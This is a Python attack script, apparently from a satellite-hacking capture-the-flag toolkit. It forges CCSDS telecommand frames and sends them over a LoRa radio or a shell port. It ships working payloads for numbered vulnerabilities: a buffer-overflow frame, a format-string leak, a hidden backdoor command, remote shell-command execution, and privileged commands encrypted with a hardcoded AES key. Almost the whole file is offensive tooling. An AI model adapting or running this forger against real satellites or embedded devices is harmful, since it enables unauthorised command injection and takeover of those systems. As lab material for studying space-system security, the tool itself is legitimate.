#!/usr/bin/env python3
"""Quick telecommand forger — sends TC via serial or outputs hex."""

import struct
import sys

# Allow running from toolkit/ directory
sys.path.insert(0, sys.path[0] or ".")
from ccsds_tools import APIDS, OPCODES, build_tc_frame, print_frame

COMMANDS = {
    "ping": (APIDS["TC_COMMAND"], bytes([OPCODES["PING"]])),
    "nop": (APIDS["TC_COMMAND"], bytes([OPCODES["NOP"]])),
    "safe": (APIDS["TC_COMMAND"], bytes([OPCODES["SET_SAFE_MODE"]])),
    "nominal": (APIDS["TC_COMMAND"], bytes([OPCODES["SET_NOMINAL"]])),
    "debug": (APIDS["TC_COMMAND"], bytes([OPCODES["SET_DEBUG"]])),
    "read-flag": (APIDS["TC_COMMAND"], bytes([OPCODES["READ_FLAG"], 0x00])),
    "backdoor": (APIDS["SECRET_DEBUG"], bytes([OPCODES["BACKDOOR"]]) + b"PWNS" + b"kernel version"),
    "exec": None,  # Needs argument
    "set-freq": None,  # Needs argument
    "crypto-oracle": None,  # Needs argument
    "privileged": None,  # Needs argument (inner opcode hex)
    "overflow": (APIDS["TC_COMMAND"], b"\x00" * 250),  # V01 trigger
    "format": (APIDS["DIAG_LOG"], b"%x %x %x %x %x %x %7$s"),  # V06
}


def _normalize_port(port: str) -> str:
    import sys
    if sys.platform == "win32" and port:
        p_up = port.upper()
        if p_up.startswith("COM"):
            try:
                if int(p_up[3:]) >= 10:
                    return rf"\\.\{p_up}"
            except ValueError:
                pass
    return port


def send_raw(port: str, data: bytes):
    """Send frame via CDC Radio port using LoRa command-mode TX."""
    import sys
    import time
    import serial

    port_path = _normalize_port(port)
    _SILENCE_S = 0.15

    ser = serial.Serial()
    ser.port = port_path
    ser.baudrate = 115200
    ser.timeout = 1.0
    ser.write_timeout = 1.0
    ser.dtr = False
    ser.rts = False
    ser.open()

    if sys.platform == "win32":
        time.sleep(0.15)

    ser.reset_input_buffer()
    ser.reset_output_buffer()

    cmd = f"TX {data.hex().upper()}\r\n"
    ser.write(cmd.encode("ascii"))
    ser.flush()

    # Read response with catnip 150ms silence window
    buf = b""
    deadline = time.monotonic() + 3.0
    last_rx = None
    while time.monotonic() < deadline:
        waiting = ser.in_waiting
        if waiting:
            buf += ser.read(waiting)
            last_rx = time.monotonic()
            time.sleep(0.02)
        else:
            if last_rx is not None and (time.monotonic() - last_rx) >= _SILENCE_S:
                break
            time.sleep(0.02)

    if buf:
        print(f"[<] Response: {buf.decode(errors='replace').strip()}")
    else:
        print("[<] No response")
    ser.close()


def inject_via_shell(port: str, data: bytes):
    """Send inject_tc command to shell port (loopback, no LoRa)."""
    import sys
    import time
    import serial

    port_path = _normalize_port(port)
    _SILENCE_S = 0.15

    ser = serial.Serial()
    ser.port = port_path
    ser.baudrate = 115200
    ser.timeout = 1.0
    ser.write_timeout = 1.0
    ser.dtr = False
    ser.rts = False
    ser.open()

    if sys.platform == "win32":
        time.sleep(0.15)

    ser.reset_input_buffer()
    ser.reset_output_buffer()

    cmd = f"inject_tc {data.hex()}\r\n"
    ser.write(cmd.encode())
    ser.flush()

    buf = b""
    deadline = time.monotonic() + 2.0
    last_rx = None
    while time.monotonic() < deadline:
        waiting = ser.in_waiting
        if waiting:
            buf += ser.read(waiting)
            last_rx = time.monotonic()
            time.sleep(0.02)
        else:
            if last_rx is not None and (time.monotonic() - last_rx) >= _SILENCE_S:
                break
            time.sleep(0.02)

    print(f"[<] Shell response:\n{buf.decode(errors='replace')}")
    ser.close()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: forge_command.py <command> [args] [--send PORT | --inject PORT]")
        print(f"Commands: {', '.join(COMMANDS.keys())}, raw")
        print("\n  raw <hex_payload> [--apid 0xNNN]  Send arbitrary opcode+payload")
        print("    Example: raw 4200               (READ_FLAG, flag_id=0)")
        print("    Example: raw 700000DEAD --apid 0x020")
        print("\nModes:")
        print("  --send PORT    Send raw frame to CDC Radio port (LoRa TX)")
        print("  --inject PORT  Send inject_tc to CDC Shell port (loopback)")
        print("  (no flag)      Print frame hex to stdout")
        sys.exit(1)

    cmd_name = sys.argv[1]
    send_port = None
    inject_port = None

    # Parse --send / --inject flags
    args = sys.argv[2:]
    filtered_args = []
    i = 0
    while i < len(args):
        if args[i] == "--send" and i + 1 < len(args):
            send_port = args[i + 1]
            i += 2
        elif args[i] == "--inject" and i + 1 < len(args):
            inject_port = args[i + 1]
            i += 2
        else:
            filtered_args.append(args[i])
            i += 1

    # Parse --apid for raw command
    raw_apid = None
    new_filtered = []
    j = 0
    while j < len(filtered_args):
        if filtered_args[j] == "--apid" and j + 1 < len(filtered_args):
            raw_apid = int(filtered_args[j + 1], 0)
            j += 2
        else:
            new_filtered.append(filtered_args[j])
            j += 1
    filtered_args = new_filtered

    # Build frame based on command
    if cmd_name == "raw" and filtered_args:
        payload = bytes.fromhex(filtered_args[0])
        apid = raw_apid if raw_apid is not None else APIDS["TC_COMMAND"]
    elif cmd_name == "exec" and filtered_args:
        shell_cmd = filtered_args[0].encode()
        apid, payload = APIDS["TC_COMMAND"], bytes([OPCODES["EXEC"]]) + shell_cmd
    elif cmd_name == "set-freq" and filtered_args:
        freq = int(filtered_args[0])
        apid, payload = APIDS["TC_SET_FREQ"], struct.pack(">I", freq)
    elif cmd_name == "crypto-oracle" and filtered_args:
        pt = bytes.fromhex(filtered_args[0])
        if len(pt) != 16:
            print(f"[!] crypto-oracle needs exactly 16 bytes, got {len(pt)}")
            sys.exit(1)
        apid, payload = APIDS["TC_COMMAND"], bytes([OPCODES["CRYPTO_ORACLE"]]) + pt
    elif cmd_name == "privileged" and filtered_args:
        inner_opcode = bytes.fromhex(filtered_args[0])
        if len(inner_opcode) > 14:
            print(f"[!] Inner command max 14 bytes, got {len(inner_opcode)}")
            sys.exit(1)
        # Build plaintext: [inner_opcode_byte][0x50 magic][remaining data][zero-pad to 16]
        plaintext = bytes([inner_opcode[0], 0x50]) + inner_opcode[1:]
        plaintext = plaintext.ljust(16, b"\x00")
        try:
            from Crypto.Cipher import AES
        except ImportError:
            try:
                from Cryptodome.Cipher import AES
            except ImportError:
                print("[!] pycryptodome required: pip install pycryptodome")
                sys.exit(1)
        key = b"PWNSAT_K3Y_2026!"
        cipher = AES.new(key, AES.MODE_ECB)
        encrypted = cipher.encrypt(plaintext)
        print(f"[*] Plaintext:  {plaintext.hex()}")
        print(f"[*] Encrypted:  {encrypted.hex()}")
        apid, payload = APIDS["TC_COMMAND"], bytes([OPCODES["PRIVILEGED"]]) + encrypted
    elif cmd_name in COMMANDS and COMMANDS[cmd_name]:
        apid, payload = COMMANDS[cmd_name]
    else:
        print(f"[!] Unknown or incomplete command: {cmd_name}")
        sys.exit(1)

    frame = build_tc_frame(apid, payload)
    print(f"[*] {cmd_name} -> APID=0x{apid:03X}, {len(payload)} bytes payload")
    print(f"[*] Frame ({len(frame)} bytes): {frame.hex()}")
    print_frame(frame)

    if send_port:
        print(f"\n[*] Sending raw frame to {send_port}...")
        send_raw(send_port, frame)
    elif inject_port:
        print(f"\n[*] Injecting via shell at {inject_port}...")
        inject_via_shell(inject_port, frame)
